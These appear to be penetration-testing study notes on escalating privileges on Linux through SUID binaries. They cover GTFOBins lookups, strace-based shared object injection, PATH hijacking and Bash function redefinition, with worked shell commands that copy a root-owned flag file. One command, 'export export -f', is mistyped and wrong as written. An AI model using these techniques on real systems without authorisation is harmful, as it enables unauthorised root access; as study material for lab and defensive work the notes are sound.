# Privilege Escalation via SUID

---

## What is SUID?

See [[suid|here]].

---

## SUID Privilege Escalation Process

1. Attempt [[suid-for-privesc#SUID Shell Escaping|SUID Shell Escaping]]
2. Attempt [[suid-for-privesc#SUID Exploitation via Shared Object Injection|SUID Exploitation via Shared Object Injection]]

---

## SUID Shell Escaping

Abuse a SUID executable to perform actions as the owning user in order to elevate privileges.

### Process

1. [[suid#Find SUID Files|Find all files configured with the SUID bit]]
2. For each SUID file:
	- Determine if the file can be exploited, based on:
		- Is the file a standard SUID executable?
			- Answer by comparing it to a list of SUID executables for the same operating system version and kinda by its nonexistence on [GTFOBins](https://gtfobins.github.io/)
		- Is the owning user valuable?
		- Can the SUID executable be exploited?
			- Search for a SUID entry on the executable on [GTFOBins](https://gtfobins.github.io/)
			- If it's not on GTFOBins, understand exactly what it's doing and attempt to exploit it manually
				- **Is a command in the SUID executable configured without an absolute path?**
					- [[suid-for-privesc#SUID Exploitation via PATH|SUID exploitation via PATH environment variable]]
				- **Is a command in the SUID executable configured with an absolute path?**
					- [[suid-for-privesc#SUID Exploitation via Bash Function Redefinition|SUID exploitation via bash function redefition]]
				- **Does a command in the SUID executable contain a wildcard (`*`)?**
					- Attempt to abuse [[bash#Wildcard Behavior|bash's wildcard behavior]] to perform an elevated action

---
	
## SUID Exploitation via Shared Object Injection

Executables often import shared object files to use their functionality. Sometimes these shared object files don't exist and the import fails. If you replaced the nonexistent shared object file with your own, you could execute arbitrary code in the context of the owner of the SUID executable.

### Process

1. [[suid#Find SUID Files|Find all files configured with the SUID bit]]
2. For each SUID file:
	- Use [[strace]] to trace the SUID executable's interaction with the kernel, looking specifically for failed shared object file imports

```bash
strace $SUID_EXECUTABLE 2>&1 | grep -i -E "open|access|no such file"
```

3. For each failed shared object file import:
	- Check your permissions on the target file or its directory. If you can replace it:
		- Replace it with a [[so-source|malicious shared object file]]
		- Run the SUID executable, which should load your malicious shared object file

---

## SUID Exploitation via `$PATH`

If a target SUID executable runs a command **without an absolute path**, it will search each directory in the `$PATH` environment variable for the command.

Since [[environment-variables#Inheritance|SUID child processes inherit environment variables]], you could write your own malicious version of the command the SUID executable is attempting to run and then add its directory to the front of the `$PATH` environment variable. Then you could run the SUID executable and it would find your malicious version of the command before the legitimate one and execute it in the security context of the owner of the SUID executable.

### Process

1. [[suid#Find SUID Files|Find all files configured with the SUID bit]]
2. For each **non-standard** SUID file:
	- Anayze the file and determine if it executes a command without an absolute path

	```bash
	$ strings /usr/bin/suid-executable
	/lib64/ld-linux-x86-64.so.2
	5q;Xq
	__gmon_start__
	libc.so.6
	setresgid
	setresuid
	system
	__libc_start_main
	GLIBC_2.2.5
	fff.
	fffff.
	l$ L
	t$(L
	|$0H
	service apache2 start
	```

	- If the executable runs a command without an absolute path:
		- Write your own version of the command to any arbitrary directory
			- You could also write a [[elf-source|malicious ELF]]
		
		```bash
		$ echo '#!/bin/bash' > /home/tgihf/service
		$ echo 'cp /root/flag.txt /dev/shm/tgihf.txt' >> /home/tgihf/service
		$ chmod +x /home/tgihf/service
		```
		
		- Add your version of the command's directory to the front of the `$PATH` environment variable
		
		```bash
		$ export PATH=/home/tgihf:$PATH
		```
		
		- Run the SUID executable, which will run your version of the command in the security context of the SUID executable's owner
		
		```bash
		$ /usr/bin/suid-executable
		$ cat /dev/shm/tgihf.txt
		flag{it-worked!}
		```


---

## SUID Exploitation via Bash Function Redefinition

If a target SUID executable runs a command **with an absolute path**, you can define a malicious Bash function with the same name as the absolute path. Since [[environment-variables#Inheritance|SUID child processes inherit environment variables]], the SUID child process will inherit the function name. Thus, when the SUID executable runs the absolute path, it will actually execute the malicious Bash function you defined.

### Process

1. [[suid#Find SUID Files|Find all files configured with the SUID bit]]
2. For each **non-standard** SUID file:
	- Anayze the file and determine if it executes a command with an absolute path

	```bash
	$ strings /usr/bin/suid-executable
	/lib64/ld-linux-x86-64.so.2
	5q;Xq
	__gmon_start__
	libc.so.6
	setresgid
	setresuid
	system
	__libc_start_main
	GLIBC_2.2.5
	fff.
	fffff.
	l$ L
	t$(L
	|$0H
	/usr/sbin/service apache2 start
	```

	- If the executable runs a command with an absolute path:
		- Define a Bash function with the same name as the absolute path:
		
		```bash
		$ function /usr/sbin/service() { cp /root/flag.txt /dev/shm/tgihf.txt; }
		```
		
		- Export the function
		
		```bash
		$ export export -f /usr/sbin/service
		```
		
		- Run the SUID executable, which will run your malicious Bash function
		
		```bash
		$ /usr/bin/suid-executable
		$ cat /dev/shm/tgihf.txt
		flag{it-worked!}
		```
